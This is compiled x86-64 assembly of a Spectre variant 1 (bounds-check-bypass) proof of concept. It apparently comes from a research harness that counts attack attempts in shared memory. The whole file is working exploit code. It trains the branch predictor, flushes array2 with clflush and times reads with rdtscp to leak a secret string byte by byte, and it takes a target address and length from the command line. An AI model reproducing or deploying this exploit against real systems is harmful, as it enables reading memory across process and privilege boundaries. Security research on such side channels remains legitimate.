	.file	"spectre.c"
	.text
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array2
	.data
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	131055
	.globl	secret
	.section	.rodata
	.align 8
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage.teste "
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	attack_num_ptr
	.align 8
	.type	attack_num_ptr, @object
	.size	attack_num_ptr, 8
attack_num_ptr:
	.zero	8
	.globl	test_att_num
	.align 8
	.type	test_att_num, @object
	.size	test_att_num, 8
test_att_num:
	.zero	8
	.text
	.globl	check
	.type	check, @function
check:
.LFB4373:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movl	array1_size(%rip), %eax
	cltq
	cmpq	%rax, -8(%rbp)
	jnb	.L2
	movl	$1, %eax
	jmp	.L3
.L2:
	movl	$0, %eax
.L3:
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4373:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4374:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movl	array1_size(%rip), %eax
	cltq
	cmpq	%rax, -8(%rbp)
	jnb	.L6
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	movzbl	(%rax,%rdx), %edx
	movzbl	temp(%rip), %eax
	andl	%edx, %eax
	movb	%al, temp(%rip)
.L6:
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4374:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4375:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%r12
	pushq	%rbx
	subq	$144, %rsp
	.cfi_offset 12, -24
	.cfi_offset 3, -32
	movq	%rdi, -136(%rbp)
	movq	%rsi, -144(%rbp)
	movq	%rdx, -152(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$0, -116(%rbp)
	movl	$0, -104(%rbp)
	jmp	.L8
.L9:
	movl	-104(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	$0, (%rdx,%rax)
	addl	$1, -104(%rbp)
.L8:
	cmpl	$255, -104(%rbp)
	jle	.L9
	movl	$999, -108(%rbp)
	jmp	.L10
.L32:
	movl	$0, -104(%rbp)
	jmp	.L11
.L12:
	movl	-104(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -56(%rbp)
	movq	-56(%rbp), %rax
	clflush	(%rax)
	nop
	addl	$1, -104(%rbp)
.L11:
	cmpl	$255, -104(%rbp)
	jle	.L12
	movl	array1_size(%rip), %ecx
	movl	-108(%rbp), %eax
	cltd
	idivl	%ecx
	movl	%edx, %eax
	cltq
	movq	%rax, -80(%rbp)
	movl	$29, -100(%rbp)
	jmp	.L13
.L16:
	movq	attack_num_ptr(%rip), %rax
	movq	(%rax), %rdx
	movq	attack_num_ptr(%rip), %rax
	addq	$1, %rdx
	movq	%rdx, (%rax)
	movq	test_att_num(%rip), %rax
	addq	$1, %rax
	movq	%rax, test_att_num(%rip)
	leaq	array1_size(%rip), %rax
	movq	%rax, -48(%rbp)
	movq	-48(%rbp), %rax
	clflush	(%rax)
	nop
	movl	$0, -112(%rbp)
	jmp	.L14
.L15:
	movl	-112(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -112(%rbp)
.L14:
	movl	-112(%rbp), %eax
	cmpl	$99, %eax
	jle	.L15
	movl	-100(%rbp), %ecx
	movslq	%ecx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movl	%ecx, %esi
	sarl	$31, %esi
	movl	%eax, %edx
	subl	%esi, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -64(%rbp)
	movq	-136(%rbp), %rax
	xorq	-80(%rbp), %rax
	andq	-64(%rbp), %rax
	xorq	-80(%rbp), %rax
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	movq	%rax, %rdi
	call	victim_function
	subl	$1, -100(%rbp)
.L13:
	cmpl	$0, -100(%rbp)
	jns	.L16
	movl	$0, -104(%rbp)
	jmp	.L17
.L21:
	movl	-104(%rbp), %eax
	imull	$167, %eax, %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -84(%rbp)
	movl	-84(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -72(%rbp)
	leaq	-116(%rbp), %rax
	movq	%rax, -32(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-32(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, %r12
	movq	-72(%rbp), %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, -116(%rbp)
	leaq	-116(%rbp), %rax
	movq	%rax, -40(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-40(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%r12, %rax
	movq	%rax, %rbx
	cmpq	$40, %rbx
	ja	.L20
	movl	array1_size(%rip), %ecx
	movl	-108(%rbp), %eax
	cltd
	idivl	%ecx
	movl	%edx, %eax
	cltq
	leaq	array1(%rip), %rdx
	movzbl	(%rax,%rdx), %eax
	movzbl	%al, %eax
	cmpl	%eax, -84(%rbp)
	je	.L20
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	%ecx, (%rdx,%rax)
.L20:
	addl	$1, -104(%rbp)
.L17:
	cmpl	$255, -104(%rbp)
	jle	.L21
	movl	$0, -104(%rbp)
	jmp	.L22
.L25:
	movl	$0, -92(%rbp)
	jmp	.L23
.L24:
	movl	-104(%rbp), %edx
	movl	-92(%rbp), %eax
	addl	%edx, %eax
	cltq
	movq	%rax, %rdi
	call	check
	movl	%eax, -88(%rbp)
	addl	$1, -92(%rbp)
.L23:
	cmpl	$17, -92(%rbp)
	jle	.L24
	addl	$1, -104(%rbp)
.L22:
	cmpl	$4095, -104(%rbp)
	jle	.L25
	movl	$-1, -96(%rbp)
	movl	-96(%rbp), %eax
	movl	%eax, -100(%rbp)
	movl	$0, -104(%rbp)
	jmp	.L26
.L31:
	cmpl	$0, -100(%rbp)
	js	.L27
	movl	-104(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-100(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L28
.L27:
	movl	-100(%rbp), %eax
	movl	%eax, -96(%rbp)
	movl	-104(%rbp), %eax
	movl	%eax, -100(%rbp)
	jmp	.L29
.L28:
	cmpl	$0, -96(%rbp)
	js	.L30
	movl	-104(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L29
.L30:
	movl	-104(%rbp), %eax
	movl	%eax, -96(%rbp)
.L29:
	addl	$1, -104(%rbp)
.L26:
	cmpl	$255, -104(%rbp)
	jle	.L31
	subl	$1, -108(%rbp)
.L10:
	cmpl	$0, -108(%rbp)
	jg	.L32
	movl	results.0(%rip), %eax
	movl	%eax, %edx
	movl	-116(%rbp), %eax
	xorl	%edx, %eax
	movl	%eax, results.0(%rip)
	movl	-100(%rbp), %eax
	movl	%eax, %edx
	movq	-144(%rbp), %rax
	movb	%dl, (%rax)
	movl	-100(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movq	-152(%rbp), %rax
	movl	%edx, (%rax)
	movq	-144(%rbp), %rax
	addq	$1, %rax
	movl	-96(%rbp), %edx
	movb	%dl, (%rax)
	movq	-152(%rbp), %rax
	leaq	4(%rax), %rdx
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	movl	%eax, (%rdx)
	nop
	movq	-24(%rbp), %rax
	subq	%fs:40, %rax
	je	.L33
	call	__stack_chk_fail@PLT
.L33:
	addq	$144, %rsp
	popq	%rbx
	popq	%r12
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4375:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
.LC1:
	.string	"/home/corvus/code/pebs_all"
.LC2:
	.string	"ftok error"
.LC3:
	.string	"shmget error"
	.align 8
.LC4:
	.string	"Putting '%s' in memory, address %p\n"
.LC5:
	.string	"%p"
.LC6:
	.string	"%d"
	.align 8
.LC7:
	.string	"Trying malicious_x = %p, len = %d\n"
.LC8:
	.string	"Reading %d bytes:\n"
	.align 8
.LC9:
	.string	"Reading at malicious_x = %p secc= %c ..."
.LC10:
	.string	"Success"
.LC11:
	.string	"Unclear"
.LC12:
	.string	"%s: "
.LC13:
	.string	"0x%02X='%c' score=%d "
	.align 8
.LC14:
	.string	"(second best: 0x%02X='%c' score=%d)"
.LC15:
	.string	"%ld"
.LC16:
	.string	"addr = %llx, pid = %d\n"
.LC17:
	.string	"shmctl error"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4376:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$112, %rsp
	movl	%edi, -100(%rbp)
	movq	%rsi, -112(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movl	$684, %esi
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	call	ftok@PLT
	movl	%eax, -80(%rbp)
	cmpl	$-1, -80(%rbp)
	jne	.L35
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$0, %eax
	jmp	.L36
.L35:
	movl	-80(%rbp), %eax
	movl	$896, %edx
	movl	$4096, %esi
	movl	%eax, %edi
	call	shmget@PLT
	movl	%eax, -76(%rbp)
	cmpl	$-1, -76(%rbp)
	jne	.L37
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$-1, %eax
	jmp	.L36
.L37:
	movl	-76(%rbp), %eax
	movl	$0, %edx
	movl	$0, %esi
	movl	%eax, %edi
	call	shmat@PLT
	movq	%rax, -56(%rbp)
	cmpq	$-1, -56(%rbp)
	je	.L38
	movq	-56(%rbp), %rax
	addq	$16, %rax
	movq	$0, (%rax)
	movq	-56(%rbp), %rax
	addq	$16, %rax
	movq	%rax, attack_num_ptr(%rip)
	jmp	.L39
.L38:
	movl	$-1, %eax
	jmp	.L36
.L39:
	call	getchar@PLT
	movb	%al, -85(%rbp)
	cmpb	$114, -85(%rbp)
	jne	.L40
	leaq	-48(%rbp), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	call	gettimeofday@PLT
	movq	-48(%rbp), %rax
	movq	%rax, %rdx
	movq	-56(%rbp), %rax
	movq	%rdx, (%rax)
	movq	-40(%rbp), %rdx
	movq	-56(%rbp), %rax
	addq	$8, %rax
	movq	%rdx, (%rax)
	movq	secret(%rip), %rdx
	movq	secret(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	secret(%rip), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -48(%rbp)
	movq	secret(%rip), %rax
	movq	%rax, %rdi
	call	strlen@PLT
	movl	%eax, -84(%rbp)
	movq	$0, -64(%rbp)
	jmp	.L41
.L42:
	leaq	array2(%rip), %rdx
	movq	-64(%rbp), %rax
	addq	%rdx, %rax
	movb	$1, (%rax)
	addq	$1, -64(%rbp)
.L41:
	cmpq	$131071, -64(%rbp)
	jbe	.L42
	cmpl	$3, -100(%rbp)
	jne	.L43
	movq	-112(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-48(%rbp), %rdx
	leaq	.LC5(%rip), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movq	-48(%rbp), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -48(%rbp)
	movq	-112(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-84(%rbp), %rdx
	leaq	.LC6(%rip), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movl	-84(%rbp), %eax
	movq	-48(%rbp), %rdx
	movq	%rdx, %rcx
	movl	%eax, %edx
	movq	%rcx, %rsi
	leaq	.LC7(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L43:
	movl	-84(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC8(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, -68(%rbp)
	jmp	.L44
.L52:
	movq	secret(%rip), %rdx
	movl	-68(%rbp), %eax
	cltq
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movsbl	%al, %eax
	movq	-48(%rbp), %rdx
	movq	%rdx, %rcx
	movl	%eax, %edx
	movq	%rcx, %rsi
	leaq	.LC9(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-48(%rbp), %rax
	leaq	-20(%rbp), %rdx
	leaq	-10(%rbp), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	readMemoryByte
	movl	-20(%rbp), %eax
	movl	-16(%rbp), %edx
	addl	%edx, %edx
	cmpl	%edx, %eax
	jl	.L45
	leaq	.LC10(%rip), %rax
	jmp	.L46
.L45:
	leaq	.LC11(%rip), %rax
.L46:
	movq	%rax, %rsi
	leaq	.LC12(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	-20(%rbp), %edx
	movzbl	-10(%rbp), %eax
	cmpb	$31, %al
	jbe	.L47
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L47
	movzbl	-10(%rbp), %eax
	movzbl	%al, %eax
	jmp	.L48
.L47:
	movl	$63, %eax
.L48:
	movzbl	-10(%rbp), %ecx
	movzbl	%cl, %esi
	movl	%edx, %ecx
	movl	%eax, %edx
	leaq	.LC13(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	-16(%rbp), %eax
	testl	%eax, %eax
	jle	.L49
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L50
	movzbl	-9(%rbp), %eax
	cmpb	$126, %al
	ja	.L50
	movzbl	-9(%rbp), %eax
	movzbl	%al, %eax
	jmp	.L51
.L50:
	movl	$63, %eax
.L51:
	movzbl	-9(%rbp), %ecx
	movzbl	%cl, %esi
	movl	%edx, %ecx
	movl	%eax, %edx
	leaq	.LC14(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L49:
	movl	$10, %edi
	call	putchar@PLT
.L44:
	movl	-84(%rbp), %eax
	testl	%eax, %eax
	jns	.L52
	movq	test_att_num(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC15(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L39
.L40:
	cmpb	$10, -85(%rbp)
	je	.L59
	cmpb	$105, -85(%rbp)
	jne	.L60
	movl	$0, %eax
	call	getpid@PLT
	movl	%eax, %edx
	leaq	check(%rip), %rax
	addq	$33, %rax
	movq	%rax, %rsi
	leaq	.LC16(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L39
.L59:
	nop
	jmp	.L39
.L60:
	nop
	movq	-56(%rbp), %rax
	movq	%rax, %rdi
	call	shmdt@PLT
	movl	-76(%rbp), %eax
	movl	$0, %edx
	movl	$0, %esi
	movl	%eax, %edi
	call	shmctl@PLT
	movl	%eax, -72(%rbp)
	cmpl	$-1, -72(%rbp)
	jne	.L57
	leaq	.LC17(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$-1, %eax
	jmp	.L36
.L57:
	movl	$0, %eax
.L36:
	movq	-8(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L58
	call	__stack_chk_fail@PLT
.L58:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4376:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
